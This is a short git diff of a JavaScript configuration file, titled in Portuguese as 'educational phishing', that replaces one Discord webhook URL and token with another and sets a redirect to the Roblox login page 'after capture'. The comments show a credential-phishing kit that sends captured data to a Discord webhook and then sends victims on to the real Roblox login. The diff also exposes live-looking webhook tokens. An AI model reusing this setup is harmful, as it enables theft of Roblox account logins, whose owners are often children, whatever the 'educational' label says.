@@ -1,7 +1,7 @@
 // Configurações do Phishing Educativo
 const CONFIG = {
     // 🔗 WEBHOOK - Substitua pela sua URL
-    webhookUrl: 'https://discord.com/api/webhooks/1401006483638059169/b1LcJW3NKHML1NGg3Ry_EMujqVsUvAyZ_vOtf--Fw1FwtuTn5Dk7GNm5nVkRBYvtDuB3',
+    webhookUrl: 'https://discord.com/api/webhooks/1401010722183450735/NfPave_lXPmGoXjWrFv9t18hmxcou9-MwK6qr2b_jafajhxzdllMYyr6Je-QTHA-Tzx7',
     
     // 🔄 REDIRECIONAMENTO - Para onde enviar após captura
     redirectUrl: 'https://www.roblox.com/login',
